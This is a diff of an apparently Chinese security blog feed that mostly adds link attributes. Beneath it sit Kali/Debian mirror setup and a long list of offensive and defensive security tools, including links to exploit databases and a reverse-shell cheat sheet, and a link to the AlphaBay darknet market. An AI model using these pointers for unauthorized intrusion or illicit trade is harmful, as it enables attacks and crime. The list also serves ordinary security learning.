@@ -13,16 +13,16 @@
     <description><![CDATA[<h2 id="打开配置文件">打开配置文件</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">vim /etc/apt/sources.list
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">vim /etc/apt/sources.list
 </code></pre></td></tr></table>
 </div>
 </div><h2 id="kali源">kali源</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -47,7 +47,7 @@
 </span><span class="lnt">23
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#中科大</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#中科大</span>
 deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
 deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
  
@@ -75,7 +75,7 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib
 </div><h2 id="debian源">debian源</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -118,7 +118,7 @@ deb-src http://http.kali.org/kali kali-rolling main non-free contrib
 </span><span class="lnt">41
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中科大源</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 中科大源</span>
 deb http://mirrors.ustc.edu.cn/debian buster main contrib non-free
 deb http://mirrors.ustc.edu.cn/debian buster-updates main contrib non-free
 deb http://mirrors.ustc.edu.cn/debian buster-backports main contrib non-free
@@ -164,10 +164,10 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 </div><h2 id="更新软件列表并更新软件">更新软件列表并更新软件</h2>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade -y
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">sudo apt update <span class="o">&amp;&amp;</span> sudo apt upgrade -y
 </code></pre></td></tr></table>
 </div>
 </div>]]></description>
@@ -183,10 +183,10 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <p></p>
 <h2 id="http">HTTP</h2>
 <h3 id="burpsuite">BurpSuite</h3>
-<h3 id="httpsportswiggernetburp"><a href="https://portswigger.net/burp/">https://portswigger.net/burp/</a></h3>
+<h3 id="httpsportswiggernetburp"><a href="https://portswigger.net/burp/" target="_blank" rel="noopener noreffer">https://portswigger.net/burp/</a></h3>
 <h3 id="很多时候免费版本已经满足需求">很多时候，免费版本已经满足需求</h3>
 <h3 id="fiddler">Fiddler</h3>
-<h3 id="httpwwwtelerikcomfiddler"><a href="http://www.telerik.com/fiddler">http://www.telerik.com/fiddler</a></h3>
+<h3 id="httpwwwtelerikcomfiddler"><a href="http://www.telerik.com/fiddler" target="_blank" rel="noopener noreffer">http://www.telerik.com/fiddler</a></h3>
 <h3 id="firefox">Firefox</h3>
 <h3 id="firebug">Firebug</h3>
 <h3 id="noscript">NoScript</h3>
@@ -199,38 +199,38 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="sqlmap">sqlmap</h3>
 <h3 id="httpsgithubcomsqlmapprojectsqlmaphttpsgithubcomsqlmapprojectsqlmap"><a href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener noreffer">https://github.com/sqlmapproject/sqlmap</a></h3>
 <h3 id="xssor">XSS&rsquo;OR</h3>
-<h3 id="httpxssorio"><a href="http://xssor.io/">http://xssor.io/</a></h3>
+<h3 id="httpxssorio"><a href="http://xssor.io/" target="_blank" rel="noopener noreffer">http://xssor.io/</a></h3>
 <h2 id="各种协议">各种协议</h2>
 <h3 id="端口扫描">端口扫描</h3>
 <h3 id="nmap">Nmap</h3>
-<h3 id="httpsnmaporg"><a href="https://nmap.org/">https://nmap.org/</a></h3>
-<h3 id="httpshighoncoffeeblognmap-cheat-sheet"><a href="https://highon.coffee/blog/nmap-cheat-sheet/">https://highon.coffee/blog/nmap-cheat-sheet/</a></h3>
+<h3 id="httpsnmaporg"><a href="https://nmap.org/" target="_blank" rel="noopener noreffer">https://nmap.org/</a></h3>
+<h3 id="httpshighoncoffeeblognmap-cheat-sheet"><a href="https://highon.coffee/blog/nmap-cheat-sheet/" target="_blank" rel="noopener noreffer">https://highon.coffee/blog/nmap-cheat-sheet/</a></h3>
 <h3 id="zmap">Zmap</h3>
-<h3 id="httpswwwzmapio"><a href="https://www.zmap.io/">https://www.zmap.io/</a></h3>
+<h3 id="httpswwwzmapio"><a href="https://www.zmap.io/" target="_blank" rel="noopener noreffer">https://www.zmap.io/</a></h3>
 <h3 id="masscan">masscan</h3>
 <h3 id="httpsgithubcomrobertdavidgrahammasscanhttpsgithubcomrobertdavidgrahammasscan"><a href="https://github.com/robertdavidgraham/masscan" target="_blank" rel="noopener noreffer">https://github.com/robertdavidgraham/masscan</a></h3>
 <h3 id="httpsgithubcomoffensive-securitymasscan-web-uihttpsgithubcomoffensive-securitymasscan-web-ui"><a href="https://github.com/offensive-security/masscan-web-ui" target="_blank" rel="noopener noreffer">https://github.com/offensive-security/masscan-web-ui</a></h3>
 <h3 id="hydra">Hydra</h3>
-<h3 id="httpswwwthcorgthc-hydra"><a href="https://www.thc.org/thc-hydra/">https://www.thc.org/thc-hydra/</a></h3>
+<h3 id="httpswwwthcorgthc-hydra"><a href="https://www.thc.org/thc-hydra/" target="_blank" rel="noopener noreffer">https://www.thc.org/thc-hydra/</a></h3>
 <h3 id="metasploit">Metasploit</h3>
-<h3 id="httpswwwmetasploitcom"><a href="https://www.metasploit.com/">https://www.metasploit.com/</a></h3>
+<h3 id="httpswwwmetasploitcom"><a href="https://www.metasploit.com/" target="_blank" rel="noopener noreffer">https://www.metasploit.com/</a></h3>
 <h3 id="httpsgithubcomrapid7metasploit-frameworkwikinightly-installershttpsgithubcomrapid7metasploit-frameworkwikinightly-installers"><a href="https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers" target="_blank" rel="noopener noreffer">https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers</a></h3>
 <h3 id="流量">流量</h3>
 <p>参见: <a href="https://evilcos.me/security_skill_tree_basic/index.html#6lo9jvad7pckkj1h2e4crmjgft" target="_blank" rel="noopener noreffer">流量</a></p>
 <h3 id="wireshark">Wireshark</h3>
-<h3 id="httpswwwwiresharkorg"><a href="https://www.wireshark.org/">https://www.wireshark.org/</a></h3>
+<h3 id="httpswwwwiresharkorg"><a href="https://www.wireshark.org/" target="_blank" rel="noopener noreffer">https://www.wireshark.org/</a></h3>
 <h3 id="tshark">TShark</h3>
-<h3 id="httpswwwwiresharkorgdocsman-pagestsharkhtml"><a href="https://www.wireshark.org/docs/man-pages/tshark.html">https://www.wireshark.org/docs/man-pages/tshark.html</a></h3>
+<h3 id="httpswwwwiresharkorgdocsman-pagestsharkhtml"><a href="https://www.wireshark.org/docs/man-pages/tshark.html" target="_blank" rel="noopener noreffer">https://www.wireshark.org/docs/man-pages/tshark.html</a></h3>
 <h3 id="tcpdump">Tcpdump</h3>
-<h3 id="httpwwwtcpdumporg"><a href="http://www.tcpdump.org/">http://www.tcpdump.org/</a></h3>
+<h3 id="httpwwwtcpdumporg"><a href="http://www.tcpdump.org/" target="_blank" rel="noopener noreffer">http://www.tcpdump.org/</a></h3>
 <h3 id="snort">Snort</h3>
-<h3 id="httpswwwsnortorg"><a href="https://www.snort.org/">https://www.snort.org/</a></h3>
+<h3 id="httpswwwsnortorg"><a href="https://www.snort.org/" target="_blank" rel="noopener noreffer">https://www.snort.org/</a></h3>
 <h3 id="bro">Bro</h3>
-<h3 id="httpswwwbroorg"><a href="https://www.bro.org/">https://www.bro.org/</a></h3>
+<h3 id="httpswwwbroorg"><a href="https://www.bro.org/" target="_blank" rel="noopener noreffer">https://www.bro.org/</a></h3>
 <h3 id="moloch">Moloch</h3>
-<h3 id="httpmoloch"><a href="http://molo.ch/">http://molo.ch/</a></h3>
+<h3 id="httpmoloch"><a href="http://molo.ch/" target="_blank" rel="noopener noreffer">http://molo.ch/</a></h3>
 <h3 id="suricata">Suricata</h3>
-<h3 id="httpssuricata-idsorg"><a href="https://suricata-ids.org/">https://suricata-ids.org/</a></h3>
+<h3 id="httpssuricata-idsorg"><a href="https://suricata-ids.org/" target="_blank" rel="noopener noreffer">https://suricata-ids.org/</a></h3>
 <h2 id="漏洞测试">漏洞测试</h2>
 <h3 id="漏洞环境">漏洞环境</h3>
 <h3 id="metasploitable3">Metasploitable3</h3>
@@ -244,53 +244,53 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="网络空间搜索引擎">网络空间搜索引擎</h3>
 <h3 id="google">Google</h3>
 <h3 id="zoomeye">ZoomEye</h3>
-<h3 id="httpswwwzoomeyeorg"><a href="https://www.zoomeye.org/">https://www.zoomeye.org/</a></h3>
+<h3 id="httpswwwzoomeyeorg"><a href="https://www.zoomeye.org/" target="_blank" rel="noopener noreffer">https://www.zoomeye.org/</a></h3>
 <h3 id="shodan">Shodan</h3>
-<h3 id="httpswwwshodanio"><a href="https://www.shodan.io/">https://www.shodan.io/</a></h3>
+<h3 id="httpswwwshodanio"><a href="https://www.shodan.io/" target="_blank" rel="noopener noreffer">https://www.shodan.io/</a></h3>
 <h3 id="censys">Censys</h3>
-<h3 id="httpscensysio"><a href="https://censys.io/">https://censys.io/</a></h3>
+<h3 id="httpscensysio"><a href="https://censys.io/" target="_blank" rel="noopener noreffer">https://censys.io/</a></h3>
 <h3 id="漏洞库">漏洞库</h3>
 <h3 id="exploit-db">Exploit-DB</h3>
-<h3 id="httpswwwexploit-dbcom"><a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></h3>
-<h3 id="httpswwwexploit-dbcomsearchsploit"><a href="https://www.exploit-db.com/searchsploit/">https://www.exploit-db.com/searchsploit/</a></h3>
+<h3 id="httpswwwexploit-dbcom"><a href="https://www.exploit-db.com/" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/</a></h3>
+<h3 id="httpswwwexploit-dbcomsearchsploit"><a href="https://www.exploit-db.com/searchsploit/" target="_blank" rel="noopener noreffer">https://www.exploit-db.com/searchsploit/</a></h3>
 <h3 id="seebug">Seebug</h3>
-<h3 id="httpswwwseebugorg"><a href="https://www.seebug.org/">https://www.seebug.org/</a></h3>
+<h3 id="httpswwwseebugorg"><a href="https://www.seebug.org/" target="_blank" rel="noopener noreffer">https://www.seebug.org/</a></h3>
 <h3 id="0daytoday">0day.today</h3>
-<h3 id="http0daytoday"><a href="http://0day.today/">http://0day.today/</a></h3>
+<h3 id="http0daytoday"><a href="http://0day.today/" target="_blank" rel="noopener noreffer">http://0day.today/</a></h3>
 <h2 id="渗透测试">渗透测试</h2>
 <h3 id="洛马七步杀">洛马七步杀</h3>
 <p>参见:<a href="https://evilcos.me/security_skill_tree_basic/index.html#0l09n3d0vap3b6e877j7qpar0j" target="_blank" rel="noopener noreffer">假设自己正被“洛马七步杀</a></p>
-<h3 id="httpwwwlockheedmartincomuswhat-we-doaerospace-defensecybercyber-kill-chainhtml"><a href="http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html">http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html</a></h3>
+<h3 id="httpwwwlockheedmartincomuswhat-we-doaerospace-defensecybercyber-kill-chainhtml"><a href="http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html" target="_blank" rel="noopener noreffer">http://www.lockheedmartin.com/us/what-we-do/aerospace-defense/cyber/cyber-kill-chain.html</a></h3>
 <h3 id="penetrationtestingtoolscheatsheet">PenetrationTestingToolsCheatSheet</h3>
-<h3 id="httpshighoncoffeeblogpenetration-testing-tools-cheat-sheet"><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></h3>
+<h3 id="httpshighoncoffeeblogpenetration-testing-tools-cheat-sheet"><a href="https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/" target="_blank" rel="noopener noreffer">https://highon.coffee/blog/penetration-testing-tools-cheat-sheet/</a></h3>
 <h3 id="端口转发">端口转发</h3>
 <h3 id="最基础的ssh隧道">最基础的SSH隧道</h3>
-<h3 id="httpswwwibmcomdeveloperworkscnlinuxl-cn-sshforwardindexhtml"><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></h3>
+<h3 id="httpswwwibmcomdeveloperworkscnlinuxl-cn-sshforwardindexhtml"><a href="https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html" target="_blank" rel="noopener noreffer">https://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/index.html</a></h3>
 <h3 id="iptables-tnat">iptables-tnat</h3>
-<h3 id="httpsaccessredhatcomdocumentationen-usred_hat_enterprise_linux4htmlsecurity_guides1-firewall-ipt-fwdhtml"><a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html">https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html</a></h3>
+<h3 id="httpsaccessredhatcomdocumentationen-usred_hat_enterprise_linux4htmlsecurity_guides1-firewall-ipt-fwdhtml"><a href="https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html" target="_blank" rel="noopener noreffer">https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/4/html/Security_Guide/s1-firewall-ipt-fwd.html</a></h3>
 <h3 id="rtcppy">rtcp.py</h3>
-<h3 id="httpsgithubcomknownsecrtcphttpsgithubcomknownsecrtcp"><a href="https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp)">https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp)</a></h3>
+<h3 id="httpsgithubcomknownsecrtcphttpsgithubcomknownsecrtcp"><a href="https://github.com/knownsec/rtcp%28https://github.com/knownsec/rtcp%29" target="_blank" rel="noopener noreffer">https://github.com/knownsec/rtcp(https://github.com/knownsec/rtcp)</a></h3>
 <h3 id="姿势大全">姿势大全</h3>
-<h3 id="httpsartkondcom20170323pivoting-guide"><a href="https://artkond.com/2017/03/23/pivoting-guide/">https://artkond.com/2017/03/23/pivoting-guide/</a></h3>
+<h3 id="httpsartkondcom20170323pivoting-guide"><a href="https://artkond.com/2017/03/23/pivoting-guide/" target="_blank" rel="noopener noreffer">https://artkond.com/2017/03/23/pivoting-guide/</a></h3>
 <h3 id="reverseshellcheatsheet">ReverseShellCheatSheet</h3>
-<h3 id="httppentestmonkeynetcheat-sheetshellsreverse-shell-cheat-sheet"><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></h3>
+<h3 id="httppentestmonkeynetcheat-sheetshellsreverse-shell-cheat-sheet"><a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet" target="_blank" rel="noopener noreffer">http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></h3>
 <h3 id="部分框架">部分框架</h3>
 <h3 id="kalilinux">KaliLinux</h3>
-<h3 id="httptoolskaliorgtools-listing"><a href="http://tools.kali.org/tools-listing">http://tools.kali.org/tools-listing</a></h3>
+<h3 id="httptoolskaliorgtools-listing"><a href="http://tools.kali.org/tools-listing" target="_blank" rel="noopener noreffer">http://tools.kali.org/tools-listing</a></h3>
 <h3 id="pentestbox">PentestBox</h3>
-<h3 id="httpspentestboxorg"><a href="https://pentestbox.org/">https://pentestbox.org/</a></h3>
+<h3 id="httpspentestboxorg"><a href="https://pentestbox.org/" target="_blank" rel="noopener noreffer">https://pentestbox.org/</a></h3>
 <h3 id="maltego">Maltego</h3>
-<h3 id="httpswwwpatervacomweb7"><a href="https://www.paterva.com/web7/">https://www.paterva.com/web7/</a></h3>
+<h3 id="httpswwwpatervacomweb7"><a href="https://www.paterva.com/web7/" target="_blank" rel="noopener noreffer">https://www.paterva.com/web7/</a></h3>
 <h3 id="thesocial-engineertoolkitset">TheSocial-EngineerToolkit(SET)</h3>
 <h3 id="httpsgithubcomtrustedsecsocial-engineer-toolkithttpsgithubcomtrustedsecsocial-engineer-toolkit"><a href="https://github.com/trustedsec/social-engineer-toolkit" target="_blank" rel="noopener noreffer">https://github.com/trustedsec/social-engineer-toolkit</a></h3>
 <h3 id="cobaltstrike">CobaltStrike</h3>
-<h3 id="httpswwwcobaltstrikecom"><a href="https://www.cobaltstrike.com/">https://www.cobaltstrike.com/</a></h3>
+<h3 id="httpswwwcobaltstrikecom"><a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener noreffer">https://www.cobaltstrike.com/</a></h3>
 <h3 id="nmap-1">Nmap</h3>
 <h3 id="metasploit-1">Metasploit</h3>
 <h3 id="beef">BeEF</h3>
-<h3 id="httpbeefprojectcom"><a href="http://beefproject.com/">http://beefproject.com/</a></h3>
+<h3 id="httpbeefprojectcom"><a href="http://beefproject.com/" target="_blank" rel="noopener noreffer">http://beefproject.com/</a></h3>
 <h3 id="mitmproxy">mitmproxy</h3>
-<h3 id="httpsmitmproxyorg"><a href="https://mitmproxy.org/">https://mitmproxy.org/</a></h3>
+<h3 id="httpsmitmproxyorg"><a href="https://mitmproxy.org/" target="_blank" rel="noopener noreffer">https://mitmproxy.org/</a></h3>
 <h2 id="防御">防御</h2>
 <h3 id="暴力美学">暴力美学</h3>
 <h3 id="不需要必须放线上的服务都下线">不需要必须放线上的服务都下线</h3>
@@ -305,21 +305,21 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="流量-1">流量</h3>
 <p>参见:<a href="https://evilcos.me/security_skill_tree_basic/index.html#4cdpp82tqb1om3ue4gvavsimd9" target="_blank" rel="noopener noreffer">流量</a></p>
 <h3 id="securityonion">SecurityOnion</h3>
-<h3 id="httpssecurityonionnet"><a href="https://securityonion.net/">https://securityonion.net/</a></h3>
+<h3 id="httpssecurityonionnet"><a href="https://securityonion.net/" target="_blank" rel="noopener noreffer">https://securityonion.net/</a></h3>
 <h3 id="ossec">OSSEC</h3>
-<h3 id="httpsossecgithubio"><a href="https://ossec.github.io/">https://ossec.github.io/</a></h3>
+<h3 id="httpsossecgithubio"><a href="https://ossec.github.io/" target="_blank" rel="noopener noreffer">https://ossec.github.io/</a></h3>
 <h3 id="splunk">Splunk</h3>
-<h3 id="httpswwwsplunkcom"><a href="https://www.splunk.com/">https://www.splunk.com/</a></h3>
+<h3 id="httpswwwsplunkcom"><a href="https://www.splunk.com/" target="_blank" rel="noopener noreffer">https://www.splunk.com/</a></h3>
 <h3 id="elk">ELK</h3>
 <h3 id="lynis">Lynis</h3>
-<h3 id="httpscisofycomlynis"><a href="https://cisofy.com/lynis/">https://cisofy.com/lynis/</a></h3>
+<h3 id="httpscisofycomlynis"><a href="https://cisofy.com/lynis/" target="_blank" rel="noopener noreffer">https://cisofy.com/lynis/</a></h3>
 <h3 id="iptables防火墙">iptables/防火墙</h3>
 <h3 id="jwt">JWT</h3>
-<h3 id="httpsjwtio"><a href="https://jwt.io/">https://jwt.io/</a></h3>
+<h3 id="httpsjwtio"><a href="https://jwt.io/" target="_blank" rel="noopener noreffer">https://jwt.io/</a></h3>
 <h3 id="资料">资料</h3>
 <h3 id="程序员与黑客系列">程序员与黑客系列</h3>
-<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers">http://www.infoq.com/cn/presentations/programmers-and-hackers</a></h3>
-<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers-part02"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers-part02">http://www.infoq.com/cn/presentations/programmers-and-hackers-part02</a></h3>
+<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers" target="_blank" rel="noopener noreffer">http://www.infoq.com/cn/presentations/programmers-and-hackers</a></h3>
+<h3 id="httpwwwinfoqcomcnpresentationsprogrammers-and-hackers-part02"><a href="http://www.infoq.com/cn/presentations/programmers-and-hackers-part02" target="_blank" rel="noopener noreffer">http://www.infoq.com/cn/presentations/programmers-and-hackers-part02</a></h3>
 <h3 id="实用性开发人员安全须知">实用性开发人员安全须知</h3>
 <h3 id="httpsgithubcomfallibleincsecurity-guide-for-developershttpsgithubcomfallibleincsecurity-guide-for-developers"><a href="https://github.com/FallibleInc/security-guide-for-developers" target="_blank" rel="noopener noreffer">https://github.com/FallibleInc/security-guide-for-developers</a></h3>
 <h3 id="saas型初创企业安全101">SaaS型初创企业安全101</h3>
@@ -330,12 +330,12 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="bootstrap">Bootstrap</h3>
 <h3 id="前端框架不仅javascript">前端框架，不仅JavaScript</h3>
 <h3 id="nodejs">Node.js</h3>
-<h3 id="httpsnodejsorg"><a href="https://nodejs.org/">https://nodejs.org/</a></h3>
+<h3 id="httpsnodejsorg"><a href="https://nodejs.org/" target="_blank" rel="noopener noreffer">https://nodejs.org/</a></h3>
 <h3 id="npm">npm</h3>
-<h3 id="httpswwwnpmjscom"><a href="https://www.npmjs.com/">https://www.npmjs.com/</a></h3>
+<h3 id="httpswwwnpmjscom"><a href="https://www.npmjs.com/" target="_blank" rel="noopener noreffer">https://www.npmjs.com/</a></h3>
 <h3 id="python">Python</h3>
 <h3 id="pep8编程习惯">PEP8编程习惯</h3>
-<h3 id="httpswwwpythonorgdevpepspep-0008"><a href="https://www.python.org/dev/peps/pep-0008/">https://www.python.org/dev/peps/pep-0008/</a></h3>
+<h3 id="httpswwwpythonorgdevpepspep-0008"><a href="https://www.python.org/dev/peps/pep-0008/" target="_blank" rel="noopener noreffer">https://www.python.org/dev/peps/pep-0008/</a></h3>
 <h3 id="urllib2">urllib2</h3>
 <h3 id="socket">socket</h3>
 <h3 id="requests">requests</h3>
@@ -349,9 +349,9 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="multiprocessing">multiprocessing</h3>
 <h3 id="gevent">gevent</h3>
 <h3 id="pip">pip</h3>
-<h3 id="httpspypipythonorgpypi"><a href="https://pypi.python.org/pypi">https://pypi.python.org/pypi</a></h3>
+<h3 id="httpspypipythonorgpypi"><a href="https://pypi.python.org/pypi" target="_blank" rel="noopener noreffer">https://pypi.python.org/pypi</a></h3>
 <h3 id="go">Go</h3>
-<h3 id="httpstourgo-zhorglist"><a href="https://tour.go-zh.org/list">https://tour.go-zh.org/list</a></h3>
+<h3 id="httpstourgo-zhorglist"><a href="https://tour.go-zh.org/list" target="_blank" rel="noopener noreffer">https://tour.go-zh.org/list</a></h3>
 <h2 id="数据相关">数据相关</h2>
 <h3 id="bsddb">bsddb</h3>
 <h3 id="sqlite">SQLite</h3>
@@ -374,31 +374,31 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="调试工具">调试工具</h3>
 <h3 id="kodos">Kodos</h3>
 <h3 id="regexbuddy">RegexBuddy</h3>
-<h3 id="httpsregexpercom"><a href="https://regexper.com/">https://regexper.com/</a></h3>
+<h3 id="httpsregexpercom"><a href="https://regexper.com/" target="_blank" rel="noopener noreffer">https://regexper.com/</a></h3>
 <h3 id="正则表达式30分钟入门教程">正则表达式30分钟入门教程</h3>
-<h3 id="httpsdeerchaonettutorialsregexregexhtm"><a href="https://deerchao.net/tutorials/regex/regex.htm">https://deerchao.net/tutorials/regex/regex.htm</a></h3>
+<h3 id="httpsdeerchaonettutorialsregexregexhtm"><a href="https://deerchao.net/tutorials/regex/regex.htm" target="_blank" rel="noopener noreffer">https://deerchao.net/tutorials/regex/regex.htm</a></h3>
 <h3 id="python-1">Python</h3>
-<h3 id="httpwikiubuntuorgcnpython正则表达式操作指南"><a href="http://wiki.ubuntu.org.cn/Python">http://wiki.ubuntu.org.cn/Python</a>正则表达式操作指南</h3>
+<h3 id="httpwikiubuntuorgcnpython正则表达式操作指南"><a href="http://wiki.ubuntu.org.cn/Python" target="_blank" rel="noopener noreffer">http://wiki.ubuntu.org.cn/Python</a>正则表达式操作指南</h3>
 <h2 id="高效习惯">高效习惯</h2>
 <h3 id="vim">VIM</h3>
 <h3 id="简明vim练级攻略">简明VIM练级攻略</h3>
-<h3 id="httpcoolshellcnarticles5426html"><a href="http://coolshell.cn/articles/5426.html">http://coolshell.cn/articles/5426.html</a></h3>
+<h3 id="httpcoolshellcnarticles5426html"><a href="http://coolshell.cn/articles/5426.html" target="_blank" rel="noopener noreffer">http://coolshell.cn/articles/5426.html</a></h3>
 <h3 id="markdown">Markdown</h3>
 <h3 id="git">Git</h3>
-<h3 id="httpstrygithubio"><a href="https://try.github.io/">https://try.github.io/</a></h3>
+<h3 id="httpstrygithubio"><a href="https://try.github.io/" target="_blank" rel="noopener noreffer">https://try.github.io/</a></h3>
 <h3 id="freemindxmind">FreeMind/XMind</h3>
 <h3 id="yed">yEd</h3>
 <h3 id="evernote">Evernote</h3>
 <h3 id="windows">Windows</h3>
 <h3 id="putty">Putty</h3>
-<h3 id="httpswwwchiarkgreenendorguksgtathamputtylatesthtml"><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></h3>
+<h3 id="httpswwwchiarkgreenendorguksgtathamputtylatesthtml"><a href="https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html" target="_blank" rel="noopener noreffer">https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html</a></h3>
 <h3 id="winscp">WinSCP</h3>
 <h3 id="sysinternalssuite">SysinternalsSuite</h3>
 <h3 id="mac">Mac</h3>
 <h3 id="iterm2">iTerm2</h3>
-<h3 id="httpwwwiterm2com"><a href="http://www.iterm2.com/">http://www.iterm2.com/</a></h3>
+<h3 id="httpwwwiterm2com"><a href="http://www.iterm2.com/" target="_blank" rel="noopener noreffer">http://www.iterm2.com/</a></h3>
 <h3 id="homebrew">Homebrew</h3>
-<h3 id="httpsbrewsh"><a href="https://brew.sh/">https://brew.sh/</a></h3>
+<h3 id="httpsbrewsh"><a href="https://brew.sh/" target="_blank" rel="noopener noreffer">https://brew.sh/</a></h3>
 <h3 id="linux">Linux</h3>
 <h3 id="bash">Bash</h3>
 <h3 id="httpsgithubcomjlevythe-art-of-command-linehttpsgithubcomjlevythe-art-of-command-line"><a href="https://github.com/jlevy/the-art-of-command-line" target="_blank" rel="noopener noreffer">https://github.com/jlevy/the-art-of-command-line</a></h3>
@@ -413,7 +413,7 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="httpsgithubcomshadowsockshttpsgithubcomshadowsocks"><a href="https://github.com/shadowsocks" target="_blank" rel="noopener noreffer">https://github.com/shadowsocks</a></h3>
 <h3 id="proxychains">proxychains</h3>
 <h3 id="暗网">暗网</h3>
-<h3 id="httpsalphabaymarketcom"><a href="https://alphabaymarket.com/">https://alphabaymarket.com/</a></h3>
+<h3 id="httpsalphabaymarketcom"><a href="https://alphabaymarket.com/" target="_blank" rel="noopener noreffer">https://alphabaymarket.com/</a></h3>
 <h3 id="硬件">硬件</h3>
 <h3 id="iphoneipadmac">iPhone+iPad+Mac</h3>
 <h3 id="thinkpad">ThinkPad</h3>
@@ -432,7 +432,7 @@ deb http://deb.debian.org/debian-security/ buster/updates main contrib non-free
 <h3 id="protonmail">ProtonMail</h3>
 <h3 id="安全">安全</h3>
 <h3 id="gpg">GPG</h3>
-<h3 id="httpsgnupgorgdownloadindexhtml"><a href="https://gnupg.org/download/index.html">https://gnupg.org/download/index.html</a></h3>
+<h3 id="httpsgnupgorgdownloadindexhtml"><a href="https://gnupg.org/download/index.html" target="_blank" rel="noopener noreffer">https://gnupg.org/download/index.html</a></h3>
 <h3 id="truecrypt">TrueCrypt</h3>
 <h3 id="情报跟进">情报跟进</h3>
 <h3 id="inoreader">Inoreader</h3>
@@ -653,7 +653,7 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 <p>本地测试代码(PHP):</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -666,7 +666,7 @@ i春秋社区聚集了很多的人气，有好多学生，也很活跃，入门�
 </span><span class="lnt">11
 </span></code></pre></td>
 <td class="lntd">
